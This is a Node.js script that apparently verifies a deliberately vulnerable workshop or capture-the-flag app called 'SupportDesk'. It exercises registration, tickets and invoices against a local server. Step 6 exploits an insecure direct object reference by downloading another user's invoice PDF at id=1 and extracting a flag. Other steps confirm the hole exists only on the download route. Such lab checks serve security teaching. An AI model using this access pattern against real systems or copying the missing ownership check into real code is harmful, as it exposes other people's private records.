import { randomBytes } from "node:crypto";
import { readFile } from "node:fs/promises";

const BASE = process.env.BASE_URL || "http://127.0.0.1:8787";

let cookie = "";
function storeCookie(res) {
  const sc = res.headers.get("set-cookie");
  if (sc) {
    const m = sc.match(/sd_session=([^;]+)/);
    if (m) cookie = `sd_session=${m[1]}`;
  }
}
function headers(extra = {}) {
  return { "Content-Type": "application/json", ...(cookie ? { Cookie: cookie } : {}), ...extra };
}

async function api(path, opts = {}) {
  const res = await fetch(BASE + path, { ...opts, headers: headers(opts.headers) });
  storeCookie(res);
  const ct = res.headers.get("content-type") || "";
  let body = null;
  if (ct.includes("application/json")) body = await res.json().catch(() => null);
  else body = await res.text().catch(() => "");
  return { res, body };
}

async function download(path, withAuth = true) {
  const res = await fetch(BASE + path, { headers: withAuth && cookie ? { Cookie: cookie } : {} });
  const buf = Buffer.from(await res.arrayBuffer());
  return { res, buf };
}

const ok = (c, msg) => { console.log((c ? "PASS" : "FAIL") + " — " + msg); if (!c) process.exitCode = 1; };

console.log("Verifying SupportDesk against", BASE);

const suffix = randomBytes(4).toString("hex");
const email = `student_${suffix}@example.com`;

// 1. register
{
  const { res, body } = await api("/api/register", {
    method: "POST",
    body: JSON.stringify({ name: "Workshop Student", email, password: "StudentPass123!" }),
  });
  ok(res.status === 201 && body.user?.email === email, `register new user (${res.status})`);
}

// 2. me
{
  const { res, body } = await api("/api/me");
  ok(res.status === 200 && body.user?.email === email, `authenticated session via HttpOnly cookie (${res.status})`);
}

// 3. create ticket
let ticketId;
{
  const { res, body } = await api("/api/tickets", {
    method: "POST",
    body: JSON.stringify({
      subject: "Billing sync fails after update",
      category: "Billing",
      priority: "Medium",
      message: "After the latest update our billing sync returns HTTP 500 for 3 of 120 customers. Logs attached in portal. Please help.",
    }),
  });
  ticketId = body.ticket?.id;
  ok(res.status === 201 && Number.isInteger(ticketId), `create ticket (#${ticketId})`);
}

// 4. generate invoice
let invoiceId, invoiceNumber;
{
  const { res, body } = await api("/api/invoices", {
    method: "POST",
    body: JSON.stringify({ ticket_id: ticketId }),
  });
  invoiceId = body.invoice?.id;
  invoiceNumber = body.invoice?.invoice_number;
  ok(res.status >= 200 && res.status < 300 && invoiceId, `generate invoice (${invoiceNumber} id=${invoiceId})`);
}

// 5. download own invoice
{
  const { res, buf } = await download(`/api/invoices/${invoiceId}/download`);
  const head = buf.subarray(0, 4).toString();
  ok(res.status === 200 && head === "%PDF" && res.headers.get("content-type")?.includes("application/pdf"), `download own invoice PDF (${buf.length} bytes)`);
  const txt = buf.toString("latin1");
  ok(txt.includes(invoiceNumber), "own PDF contains own invoice number");
  ok(!/SDC\{[^}]+\}/.test(txt), "own PDF does NOT contain another user's flag");
}

// 6. target exists at id=1 (IDOR)
let flag = null;
{
  const { res, buf } = await download("/api/invoices/1/download");
  const txt = buf.toString("latin1");
  const m = txt.match(/SDC\{[^}]+\}/);
  flag = m?.[0] || null;
  ok(res.status === 200 && buf.subarray(0, 4).toString() === "%PDF", "target invoice id=1 exists and returns PDF");
  ok(!!flag, `IDOR exploit works — extracted flag from invoice 1 PDF (${flag ? "yes" : "no"})`);
  if (flag) console.log("FLAG:", flag);
}

// 7. JSON detail for id=1 must NOT leak (ownership enforced there)
{
  const { res } = await api("/api/invoices/1");
  ok(res.status === 404, `JSON detail for invoice 1 is protected (got ${res.status}, want 404)`);
}

// 8. unauthenticated download must fail
{
  const { res } = await download("/api/invoices/1/download", false);
  ok(res.status === 401, `unauthenticated download blocked (got ${res.status}, want 401)`);
}

// 9. flag isolation: seed + frontend must not contain the flag literal
{
  const seed = await readFile(new URL("../migrations/0002_seed.sql", import.meta.url), "utf8").catch(() => "");
  const appjs = await readFile(new URL("../public/app.js", import.meta.url), "utf8").catch(() => "");
  const indexHtml = await readFile(new URL("../public/index.html", import.meta.url), "utf8").catch(() => "");
  const src = await readFile(new URL("../src/index.ts", import.meta.url), "utf8").catch(() => "");
  const hasLiteral = (s) => flag && s.includes(flag);
  ok(!hasLiteral(seed), "seed file does not contain flag");
  ok(!hasLiteral(appjs) && !hasLiteral(indexHtml), "frontend does not contain flag");
  // backend must not contain the literal "SDC{" + flag-body; we keep it split.
  const fullFlagInSrc = flag ? src.includes(flag) : true;
  ok(!fullFlagInSrc, "backend source does not contain flag literal (assembled at runtime)");
  // API JSON must not contain flag
  const { body } = await api("/api/invoices");
  ok(!JSON.stringify(body).includes(flag || "SDC{"), "invoice list JSON does not leak flag");
}

console.log(process.exitCode ? "VERIFY FAILED" : "VERIFY OK");
